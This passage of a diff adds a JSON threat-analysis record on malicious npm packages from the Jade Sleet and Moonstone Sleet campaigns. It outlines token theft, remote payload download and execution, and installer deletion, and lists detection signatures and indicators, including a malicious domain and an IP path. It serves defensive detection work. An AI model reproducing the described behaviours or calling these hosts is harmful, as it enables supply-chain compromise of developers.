+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Preparation for further malicious activity by second package."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Second package reads local token, exfiltrates it, downloads and executes new malicious code.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Arbitrary code execution and further compromise."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Single-package variant (Moonstone Sleet) downloads, decrypts, and executes remote payload on Windows, then deletes evidence.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Immediate compromise and anti-forensics."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Linux-targeting variant sets up directory, installs and runs disguised binary, deletes installer script.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Persistence and stealthy execution on Linux systems."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Creation of hidden or misleadingly named directories in user home or application support paths (e.g., .svnlook, ~/Library/Application Support/UpdateProvider)",
+                    "Synchronous or asynchronous network requests to hardcoded suspicious domains or IPs during install/import",
+                    "Writing and executing files downloaded from remote servers, especially as new scripts or binaries",
+                    "Immediate deletion of installer or script files after execution (anti-forensics)",
+                    "Conditional OS-specific payload execution (e.g., Windows vs Linux branches)",
+                    "Disabling TLS certificate validation in Node.js environment"
+                  ],
+                  "file_indicators": [
+                    ".svnlook directory in user home",
+                    "svntoken, checksvn.js, preinstall.bat, preinstall.ps1, sqlite.a, updateMacOS",
+                    "deference.js (deleted post-execution)",
+                    "~/Library/Application Support/UpdateProvider"
+                  ],
+                  "network_indicators": [
+                    "cryptopriceoffer.com (checkupdate.php, getupdate.php)",
+                    "103.179.142.171/npm/npm.mov",
+                    "Other hardcoded C2 domains/IPs"
+                  ],
+                  "how_to_detect": "Monitor for creation of hidden or misleadingly named directories and files in user home or application support paths, unexpected network requests to known malicious domains or IPs during install/import, execution of downloaded scripts or binaries, and immediate file deletion post-install. Flag packages that conditionally execute OS-specific payloads, disable TLS certificate validation, or use obfuscated/encoded payloads. Correlate with known IOCs and behavioral patterns from Jade Sleet and Moonstone Sleet campaigns for high-confidence detection."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
